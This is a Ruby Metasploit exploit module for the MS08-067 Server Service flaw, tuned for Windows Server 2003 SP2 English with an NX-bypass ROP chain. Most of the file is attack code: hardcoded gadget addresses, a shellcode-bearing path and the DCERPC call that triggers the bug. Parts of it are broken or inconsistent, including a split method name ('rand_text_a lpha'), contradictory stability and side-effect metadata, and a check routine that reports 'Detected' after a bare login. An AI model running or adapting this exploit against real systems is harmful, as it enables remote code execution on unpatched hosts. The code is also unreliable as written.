class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking
  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS08-067 Microsoft Server Service Relative Path Stack Corruption - Win2003 SP2 English (NX)',
        'Description' => %q{
          This module exploits a parsing flaw in the path canonicalization code of
          NetAPI32.dll through the Server Service on Windows Server 2003 SP2 English with NX enabled.
          This is optimized for lab environments with Windows 2003 SP2 English (NX).
        },
        'Author' => [
          'NHAT', 
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'AKA' => ['ECLIPSEDWING'],
          'Stability' => CRASH_SAFE,
          'Reliability' => REPEATABLE_SESSION,
          'SideEffects' => PHYSICAL_EFFECTS
        },
        'References' => [
          %w(CVE 2008-4250),
          %w(OSVDB 49243),
          %w(MSB MS08-067),
          ['URL', 'https://www.rapid7.com/db/vulnerabilities/dcerpc-ms-netapi-netpathcanonicalize-dos/']
        ],
        'DefaultOptions' => {
          'EXITFUNC' => 'thread',
        },
        'Privileged' => true,
        'Payload' => {
          'Space' => 408,
          'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40",
          'Prepend' => "\x81\xE4\xF0\xFF\xFF\xFF", # stack alignment
          'StackAdjustment' => -3500,
        },
        'Platform' => 'win',
        'DefaultTarget' => 0,
        'Targets' => [
          [
            'Windows 2003 SP2 English (NX) - Lab Target',
            {
              # Brett Moore's NX bypass chain for Windows 2003 SP2 English
              'RetDec' => 0x7c86beb8,  # dec ESI, ret @NTDLL.DLL
              'RetPop' => 0x7ca1e84e,  # push ESI, pop EBP, ret @SHELL32.DLL
              'JmpESP' => 0x7c86a01b,  # jmp ESP @NTDLL.DLL
              'DisableNX' => 0x7c83f517, # NX disable @NTDLL.DLL
              'Scratch' => 0x00020408, # Writable memory location
            }
          ],
        ],
        'DisclosureDate' => '2008-10-28'
      )
    )
    register_options(
      [
        OptString.new('SMBPIPE', [true, 'The pipe name to use (BROWSER, SRVSVC)', 'BROWSER']),
      ]
    )
    deregister_options('SMB::ProtocolVersion')
  end

  def check
    begin
      connect(versions: [1])
      smb_login
      disconnect
      return Exploit::CheckCode::Detected
    rescue Rex::ConnectionError, Rex::Proto::SMB::Exceptions::LoginError => e
      vprint_error("Check failed: #{e.message}")
      return Exploit::CheckCode::Unknown
    end
  end

  def exploit
    begin
      print_status("Connecting to target...")
      connect(versions: [1])
      smb_login
      print_good("Successfully authenticated to target")
    rescue Rex::Proto::SMB::Exceptions::LoginError => e
      if e.message =~ /Connection reset/
        print_error('Connection reset during login (likely previous crash)')
        print_error('Please restart the target machine and try again')
        return
      else
        raise e
      end
    end

    mytarget = target
    padder = [*('A'..'Z')]
    pad = 'A'
    while pad.length < 7
      c = padder[rand(padder.length)]
      next if pad.index(c)
      pad += c
    end
    prefix = '\\'
    path = ''
    server = Rex::Text.rand_text_alpha(rand(8) + 1).upcase

    # --- NX Bypass chain construction for Windows 2003 SP2 English ---
    jumper = Rex::Text.rand_text_alpha(70).upcase
    
    # Decrement ESI multiple times to align it properly
    jumper[0, 4] = [mytarget['RetDec']].pack('V')  # dec ESI, ret
    jumper[4, 4] = [mytarget['RetDec']].pack('V')  # dec ESI, ret
    jumper[8, 4] = [mytarget['RetDec']].pack('V')  # dec ESI, ret
    jumper[12, 4] = [mytarget['RetDec']].pack('V') # dec ESI, ret
    jumper[16, 4] = [mytarget['RetDec']].pack('V') # dec ESI, ret
    
    # Setup the NX bypass
    jumper[20, 4] = [mytarget['RetPop']].pack('V') # push ESI, pop EBP, ret
    jumper[24, 4] = [mytarget['DisableNX']].pack('V') # Disable NX
    
    # Jump to shellcode area
    jumper[56, 4] = [mytarget['JmpESP']].pack('V') # jmp ESP
    jumper[60, 4] = [mytarget['JmpESP']].pack('V') # jmp ESP
    jumper[64, 2] = "\xeb\x02"                      # Short jump forward
    jumper[68, 2] = "\xeb\x62"                      # Original jump

    # --- Build the malicious path name ---
    path =
      Rex::Text.to_unicode('\\') +
      # Buffer removed from front
      Rex::Text.rand_text_a lpha(100) +
      # Shellcode
      payload.encoded +
      # Relative path to trigger the bug
      Rex::Text.to_unicode('\\..\\..\\') +
      # Extra padding
      Rex::Text.to_unicode(pad) +
      # Writable memory location (static) - This goes into EBP
      [mytarget['Scratch']].pack('V') +
      # Return to the first gadget in the ROP chain
      [mytarget['RetDec']].pack('V') +
      # Padding with embedded jump (NX bypass chain)
      jumper +
      # NULL termination
      "\x00" * 2

    # --- Send the exploit ---
    handle = dcerpc_handle(
      '4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0', # NetApi interface
      'ncacn_np', ["\\#{datastore['SMBPIPE']}"] # Named pipe
    )
    dcerpc_bind(handle)
    stub =
      NDR.uwstring(server) +
      NDR.UnicodeConformantVaryingStringPreBuilt(path) +
      NDR.long(rand(1024)) + # OutbufLen
      NDR.wstring(prefix) + # Prefix
      NDR.long(4097) + # PathType
      NDR.long(0) # Flags

    print_status('Attempting to trigger the vulnerability on Windows 2003 SP2 English (NX)...')
    dcerpc.call(0x1f, stub, false) # Call NetprPathCanonicalize (0x1f)

    # Cleanup
    handler
    disconnect
  rescue => e
    print_error("Exploit failed: #{e.message}")
    print_error("Backtrace: #{e.backtrace.join("\n")}")
    disconnect rescue nil
  end
end